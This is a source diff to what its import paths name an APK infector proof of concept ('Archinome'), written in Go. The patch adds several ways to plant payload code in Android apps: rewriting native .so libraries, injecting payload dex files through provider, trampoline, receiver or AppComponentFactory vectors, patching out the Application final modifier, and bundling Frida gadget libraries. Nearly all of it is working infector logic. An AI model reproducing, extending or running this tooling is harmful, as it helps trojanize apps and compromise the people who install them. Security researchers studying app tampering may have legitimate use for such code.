@@ -13,12 +13,17 @@ import (
 
 	"github.com/thatskriptkid/apk-infector-Archinome-PoC/internal/utils"
 	"github.com/thatskriptkid/apk-infector-Archinome-PoC/pkg/dex"
+	"github.com/thatskriptkid/apk-infector-Archinome-PoC/pkg/nativepatch"
 )
 
 var zipOutput, _ = filepath.Abs("sample_unzipped")
 var injectedAppPrevName, _ = filepath.Abs("InjectedApp_patched.dex")
 var payload_custom_name, _ = filepath.Abs("payload_custom.dex")
 var payload_frida_name, _ = filepath.Abs("payload_frida.dex")
+var payload_provider_name, _ = filepath.Abs("payload_provider.dex")
+var payload_trampoline_name, _ = filepath.Abs("payload_trampoline.dex")
+var payload_receiver_name, _ = filepath.Abs("payload_receiver.dex")
+var payload_appfactory_name, _ = filepath.Abs("payload_appfactory.dex")
 var frida_gadget_path_arm64, _ = filepath.Abs(fmt.Sprintf("%s%c%s%c%s%c%s", zipOutput, os.PathSeparator, "lib", os.PathSeparator, "arm64-v8a", os.PathSeparator, "libfrida-gadget.so"))
 var frida_gadget_path_arm, _ = filepath.Abs(fmt.Sprintf("%s%c%s%c%s%c%s", zipOutput, os.PathSeparator, "lib", os.PathSeparator, "armeabi-v7a", os.PathSeparator, "libfrida-gadget.so"))
 var frida_gadget_path_x86, _ = filepath.Abs(fmt.Sprintf("%s%c%s%c%s%c%s", zipOutput, os.PathSeparator, "lib", os.PathSeparator, "x86", os.PathSeparator, "libfrida-gadget.so"))
@@ -108,11 +113,25 @@ func Inject(path string, zipModifiedOutput string) {
 		//log.Printf("Unzipped:\n" + strings.Join(files, "\n"))
 	}
 
-	// patch out Application final modifier
-	for _, path := range files {
-		if strings.Contains(path, "classes") {
-			dex.Patch_app_modifier(path)
+	if utils.Payload_option == int(utils.Native_payload) {
+		// Native vector: rewrite lib/<abi>/*.so and drop the payload library in
+		// place. The manifest, the dex files and the resources stay untouched.
+		results, err := nativepatch.Apply(zipOutput, nativepatch.Options{
+			ABI:     os.Getenv("ARCHINOME_NATIVE_ABI"),
+			HostLib: os.Getenv("ARCHINOME_NATIVE_HOST"),
+			Mode:    nativepatch.Mode(os.Getenv("ARCHINOME_NATIVE_MODE")),
+			Payload: os.Getenv("ARCHINOME_NATIVE_LIB"),
+			OurName: os.Getenv("ARCHINOME_NATIVE_NAME"),
+		})
+		if err != nil {
+			log.Panic("Failed to apply the native vector: ", err)
 		}
+		for _, r := range results {
+			log.Printf("native: %s", r)
+			fmt.Println("	--" + r.String())
+		}
+		ZipWriter(zipModifiedOutput)
+		return
 	}
 
 	//calc classes.dex index
@@ -120,43 +139,68 @@ func Inject(path string, zipModifiedOutput string) {
 	log.Printf("max classes dex index = %d", max)
 	max += 1
 
-	// inject InjectedApp.dex
-	var injectedAppNewName = "classes" + strconv.Itoa(max) + ".dex"
+	if utils.Payload_option == int(utils.Provider_payload) || utils.Payload_option == int(utils.Trampoline_payload) || utils.Payload_option == int(utils.Receiver_payload) || utils.Payload_option == int(utils.AppComponentFactory_payload) {
+		// Provider / trampoline / receiver / app-component-factory vectors: no
+		// Application hijack, no final-modifier patch, no frida gadget. Just
+		// inject the payload dex.
+		var payloadNewName = "classes" + strconv.Itoa(max) + ".dex"
+		var src string
+		switch utils.Payload_option {
+		case int(utils.Provider_payload):
+			src = payload_provider_name
+		case int(utils.Trampoline_payload):
+			src = payload_trampoline_name
+		case int(utils.AppComponentFactory_payload):
+			src = payload_appfactory_name
+		default:
+			src = payload_receiver_name
+		}
+		copy(src, fmt.Sprintf("%s%c%s", zipOutput, os.PathSeparator, payloadNewName))
+		log.Printf("Successfuly injected DEX: %s", payloadNewName)
+	} else {
+		// patch out Application final modifier
+		for _, path := range files {
+			if strings.Contains(path, "classes") {
+				dex.Patch_app_modifier(path)
+			}
+		}
 
-	copy(injectedAppPrevName, fmt.Sprintf("%s%c%s", zipOutput, os.PathSeparator, injectedAppNewName))
+		// inject InjectedApp.dex
+		var injectedAppNewName = "classes" + strconv.Itoa(max) + ".dex"
 
-	max += 1
+		copy(injectedAppPrevName, fmt.Sprintf("%s%c%s", zipOutput, os.PathSeparator, injectedAppNewName))
 
-	// inject payload.dex
-	var payloadNewName = "classes" + strconv.Itoa(max) + ".dex"
+		max += 1
 
-	var payload_name string
+		// inject payload.dex
+		var payloadNewName = "classes" + strconv.Itoa(max) + ".dex"
 
-	if (utils.Payload_option == int(utils.Custom_payload)) {
-		payload_name = payload_custom_name
-	} else if (utils.Payload_option == int(utils.Frida_payload)) {
-		payload_name = payload_frida_name
+		var payload_name string
+
+		if utils.Payload_option == int(utils.Custom_payload) {
+			payload_name = payload_custom_name
+		} else if utils.Payload_option == int(utils.Frida_payload) {
+			payload_name = payload_frida_name
+		}
+
+		copy(payload_name, fmt.Sprintf("%s%c%s", zipOutput, os.PathSeparator, payloadNewName))
+
+		log.Printf("Successfuly injected DEX:" + injectedAppNewName + "," + payloadNewName)
+
+		// inject frida gadget
+		CopyFile(fmt.Sprintf("%s%c%s", "frida_gadget", os.PathSeparator, "frida-gadget-16.1.1-android-arm64.so"), frida_gadget_path_arm64)
+		CopyFile(fmt.Sprintf("%s%c%s", "frida_gadget", os.PathSeparator, "frida-gadget-16.1.1-android-arm.so"), frida_gadget_path_arm)
+		CopyFile(fmt.Sprintf("%s%c%s", "frida_gadget", os.PathSeparator, "frida-gadget-16.1.1-android-x86.so"), frida_gadget_path_x86)
+		CopyFile(fmt.Sprintf("%s%c%s", "frida_gadget", os.PathSeparator, "frida-gadget-16.1.1-android-x86_64.so"), frida_gadget_path_x64)
 	}
-
-	copy(payload_name, fmt.Sprintf("%s%c%s", zipOutput, os.PathSeparator, payloadNewName))
-
-	log.Printf("Successfuly injected DEX:" + injectedAppNewName + "," + payloadNewName)
 
 	//replace manifest
 	copy(utils.ManifestBinaryPath, fmt.Sprintf("%s%c%s", zipOutput, os.PathSeparator, "AndroidManifest.xml"))
 
-	// inject frida gadget
-	CopyFile(fmt.Sprintf("%s%c%s", "frida_gadget", os.PathSeparator, "frida-gadget-16.1.1-android-arm64.so"), frida_gadget_path_arm64)
-	CopyFile(fmt.Sprintf("%s%c%s", "frida_gadget", os.PathSeparator, "frida-gadget-16.1.1-android-arm.so"), frida_gadget_path_arm)
-	CopyFile(fmt.Sprintf("%s%c%s", "frida_gadget", os.PathSeparator, "frida-gadget-16.1.1-android-x86.so"), frida_gadget_path_x86)
-	CopyFile(fmt.Sprintf("%s%c%s", "frida_gadget", os.PathSeparator, "frida-gadget-16.1.1-android-x86_64.so"), frida_gadget_path_x64)
-
-
 	// // zip all files
-	fmt.Println("\t--zipping...")
+	fmt.Println("	--zipping...")
 	ZipWriter(zipModifiedOutput)
 
-	
 }
 
 func ZipWriter(zipModifiedOutput string) {
